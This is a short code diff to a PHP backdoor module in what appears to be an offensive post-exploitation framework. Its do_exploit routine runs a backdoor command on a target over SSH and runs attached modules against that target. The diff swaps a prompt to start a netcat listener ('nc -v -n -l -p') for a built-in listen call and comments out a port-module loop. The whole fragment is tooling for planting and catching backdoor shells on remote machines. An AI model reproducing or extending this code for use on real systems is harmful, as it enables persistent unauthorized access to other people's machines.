@@ -20,13 +20,14 @@ class Php(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
-        input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
+        #input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
+        self.listen()
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command(self.get_command())
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit(self.get_command())
-        for mod in self.portModules.keys():
-            print(INFO + "Attempting to execute " + mod.name + " module...")
-            mod.exploit(self.get_port())
+       # for mod in self.portModules.keys():
+       #     print(INFO + "Attempting to execute " + mod.name + " module...")
+       #     mod.exploit(self.get_port())
 
